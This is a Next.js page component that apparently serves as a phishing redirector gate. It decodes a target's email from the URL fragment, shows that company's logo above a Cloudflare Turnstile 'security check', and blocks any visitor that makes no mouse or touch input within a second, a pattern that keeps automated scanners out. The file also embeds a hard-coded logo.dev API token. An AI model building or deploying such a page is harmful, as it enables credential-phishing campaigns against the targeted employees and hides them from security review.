import React, { useEffect, useRef, useState } from "react";
import Script from "next/script";

function Short({ shortCode, path }) {
  const formRef = useRef(null);
  const [logoUrl, setLogoUrl] = useState(null); // Initialize as null
  const [loading, setLoading] = useState(true); // State to track loading
  const [interactionDetected, setInteractionDetected] = useState(false); // Track interaction
  const [isBlocked, setIsBlocked] = useState(false); // Track blocked state

  useEffect(() => {
    const fragment = window.location.hash ? window.location.hash.substring(1) : "";
    if (fragment) {
      try {
        const decodedEmail = atob(fragment);
        const domain = decodedEmail.split("@")[1];

        if (domain) {
          const fetchLogo = async () => {
            try {
              const res = await fetch(
                `https://img.logo.dev/${domain}?token=pk_a1ON8zu_S9Kx_sY-dBaKHQ&size=50&format=png&retina=true`
              );
              if (res.ok) {
                setLogoUrl(`https://img.logo.dev/${domain}?token=pk_a1ON8zu_S9Kx_sY-dBaKHQ&size=50&format=png&retina=true`);
              } else {
                console.log("No logo found for domain, not setting placeholder.");
                setLogoUrl(null); // No logo or placeholder
              }
            } catch (error) {
              console.error("Error fetching logo:", error);
              setLogoUrl(null); // Handle fetch error
            } finally {
              setLoading(false); // Stop loading regardless of outcome
            }
          };

          fetchLogo();
        } else {
          setLoading(false); // Stop loading if no domain found
        }
      } catch (error) {
        console.error("Error decoding Base64 fragment:", error);
        setLoading(false); // Stop loading on error
      }
    } else {
      setLoading(false); // Stop loading if no fragment
    }

    // Interaction tracking logic
    const handleInteraction = () => {
      setInteractionDetected(true); // Set interaction as detected
      window.removeEventListener("mousemove", handleInteraction);
      window.removeEventListener("touchstart", handleInteraction);
    };

    // Add event listeners for mouse and touch interactions
    window.addEventListener("mousemove", handleInteraction);
    window.addEventListener("touchstart", handleInteraction);

    // Block user if no interaction within 2 seconds
    const interactionTimeout = setTimeout(() => {
      if (!interactionDetected) {
        setIsBlocked(true); // Set blocked state
      }
    }, 1000);

    // Cleanup event listeners and timeout
    return () => {
      window.removeEventListener("mousemove", handleInteraction);
      window.removeEventListener("touchstart", handleInteraction);
      clearTimeout(interactionTimeout);
    };
  }, [shortCode, interactionDetected]);

  if (isBlocked) {
    // Render the blocked page
    return (
      <div className="blocked-container">
        <h1>Access Denied</h1>
        <p>Your access has been blocked due to inactivity. Please try again later.</p>
        <style jsx>{`
          .blocked-container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            background-color: #f8d7da;
            color: #721c24;
          }
        `}</style>
      </div>
    );
  }

  return (
    <div className="container">
      {loading ? (
        <div className="skeleton"></div> // Show loading skeleton
      ) : logoUrl ? (
        <img 
          src={logoUrl} 
          alt="Dynamic Security Check Logo" 
          className="logo"
        />
      ) : null}
      <h1>
        Complete the security check to confirm you are <u><a href="https://developers.cloudflare.com/bots/">not a bot</a></u>. This helps protect our organization from threats and spam.
      </h1>

      <form ref={formRef} action="/api/verify-turnstile" method="POST">
        <input type="hidden" name="shortCode" value={shortCode} />
        <input type="hidden" name="path" value={path} />
        <div
          className="cf-turnstile"
          data-sitekey={
            process.env.NEXT_PUBLIC_TURNSTILE_SITE_KEY || "0x4AAAAAAAzbaCIIxhpKU4HJ"
          }
          data-callback="handleCaptchaSuccess"
        ></div>
      </form>
      <Script
        src="https://challenges.cloudflare.com/turnstile/v0/api.js"
        async
        defer
      />
      <style jsx>{`
        .container {
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
          height: 100vh;
          text-align: center;
        }
        .logo {
          margin-bottom: 5px;
        }
        .skeleton {
          width: 50px;
          height: 50px;
          background-color: #ccc;
          border-radius: 5px;
          margin-bottom: 5px;
        }
      `}</style>
    </div>
  );
}

export async function getServerSideProps(context) {
  const { params } = context;
  const { short, path = [] } = params;

  const shortCode = short;
  const pathSegments = path.join("/");

  console.log("getServerSideProps - shortCode:", shortCode);
  console.log("getServerSideProps - path:", pathSegments);

  if (!shortCode) {
    return {
      notFound: true,
    };
  }

  return {
    props: {
      shortCode,
      path: pathSegments,
    },
  };
}

export default Short;
